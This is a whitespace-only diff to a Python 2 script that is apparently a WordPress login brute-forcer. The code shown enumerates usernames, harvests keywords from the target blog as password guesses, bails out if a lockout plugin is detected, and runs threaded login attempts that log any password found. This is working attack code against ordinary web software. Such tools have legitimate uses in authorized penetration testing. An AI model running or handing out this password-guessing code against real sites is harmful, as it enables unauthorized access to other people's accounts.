@@ -38,17 +38,17 @@ class WpbfThread(threading.Thread):
 
     def run(self):
         while self.queue.qsize() > 0:
-	    try:
-		word = self.queue.get()
-		logger.debug("Trying with "+word)
-		if wp.login(config.username, word):
-		    logger.info("Password '"+word+"' found for username '"+config.username+"' on "+wp._login_url)
-		    self.queue.queue.clear()
-		self.queue.task_done()
-	    except urllib2.HTTPError, e:
-		logger.debug("HTTP Error: "+str(e)+"for: "+word)
-		self.queue.put(word)
-		logger.debug("Requeued: "+word)
+            try:
+                word = self.queue.get()
+                logger.debug("Trying with "+word)
+                if wp.login(config.username, word):
+                    logger.info("Password '"+word+"' found for username '"+config.username+"' on "+wp._login_url)
+                    self.queue.queue.clear()
+                self.queue.task_done()
+            except urllib2.HTTPError, e:
+                logger.debug("HTTP Error: "+str(e)+"for: "+word)
+                self.queue.put(word)
+                logger.debug("Requeued: "+word)
 
 if __name__ == '__main__':
     #parse command line arguments
@@ -91,9 +91,9 @@ if __name__ == '__main__':
 
     # enumerate usernames
     if args.enumerateusers:
-	logger.info("Enumerating users...")
-	logger.info("Usernames: "+join(wp.enumerate_usernames(config.eu_gap_tolerance), ", "))
-	exit(0)
+        logger.info("Enumerating users...")
+        logger.info("Usernames: "+join(wp.enumerate_usernames(config.eu_gap_tolerance), ", "))
+        exit(0)
 
     # queue
     queue = Queue.Queue()
@@ -104,13 +104,13 @@ if __name__ == '__main__':
         if wp.check_username(config.username) is False:
             logger.warning("Possible non existent username: "+config.username)
             logger.info("Enumerating users...")
-	    enumerated_usernames = wp.enumerate_usernames(config.eu_gap_tolerance)
-	    if len(enumerated_usernames) > 0:
-		logger.info("Usernames: "+join(enumerated_usernames, ", "))
-		config.username = enumerated_usernames[0]
-	    else:
-		logger.info("Trying to find username in HTML content...")
-		config.username = wp.find_username()
+            enumerated_usernames = wp.enumerate_usernames(config.eu_gap_tolerance)
+            if len(enumerated_usernames) > 0:
+                logger.info("Usernames: "+join(enumerated_usernames, ", "))
+                config.username = enumerated_usernames[0]
+            else:
+                logger.info("Trying to find username in HTML content...")
+                config.username = wp.find_username()
             if config.username is False:
                 logger.error("Can't find username :(")
                 sys.exit(0)
@@ -132,18 +132,18 @@ if __name__ == '__main__':
     # check for Login LockDown plugin
     logger.debug("Checking for Login LockDown plugin")
     if wp.check_loginlockdown():
-	logger.warning("Login LockDown plugin is active, bruteforce will be useless")
-	sys.exit(0)
+        logger.warning("Login LockDown plugin is active, bruteforce will be useless")
+        sys.exit(0)
 
     # load username into queue
     if config.username not in queue.queue:
-	queue.put(config.username)
+        queue.put(config.username)
 
     # load into queue additional keywords from blog main page
     if args.nokeywords:
-	logger.info("Load into queue additional words using keywords from blog...")
-	queue.put(filter_domain(urlparse.urlparse(wp._base_url).hostname))     # add domain name to the queue
-	[queue.put(w) for w in wp.find_keywords_in_url(config.min_keyword_len, config.min_frequency, config.ignore_with) ]
+        logger.info("Load into queue additional words using keywords from blog...")
+        queue.put(filter_domain(urlparse.urlparse(wp._base_url).hostname))     # add domain name to the queue
+        [queue.put(w) for w in wp.find_keywords_in_url(config.min_keyword_len, config.min_frequency, config.ignore_with) ]
 
     # load wordlist into queue
     logger.debug("Loading wordlist...")
@@ -158,18 +158,18 @@ if __name__ == '__main__':
 
     # feedback to stdout
     while queue.qsize() > 0:
-	try:
-	    # poor ETA implementation
-	    start_time = time.time()
-	    start_queue = queue.qsize()
-	    time.sleep(10)
-	    delta_time = time.time() - start_time
-	    current_queue = queue.qsize()
-	    delta_queue = start_queue - current_queue
-	    wps = delta_time / delta_queue
-	    print str(current_queue)+" words left / "+str(round(1 / wps, 2))+" passwords per second / "+str( round((wps*current_queue / 60)/60,2) )+"h left"
+        try:
+            # poor ETA implementation
+            start_time = time.time()
+            start_queue = queue.qsize()
+            time.sleep(10)
+            delta_time = time.time() - start_time
+            current_queue = queue.qsize()
+            delta_queue = start_queue - current_queue
+            wps = delta_time / delta_queue
+            print str(current_queue)+" words left / "+str(round(1 / wps, 2))+" passwords per second / "+str( round((wps*current_queue / 60)/60,2) )+"h left"
         except KeyboardInterrupt:
-	    logger.info("Clearing queue and killing threads...")
-	    queue.queue.clear()
+            logger.info("Clearing queue and killing threads...")
+            queue.queue.clear()
             for t in threading.enumerate()[1:]:
                 t.join()
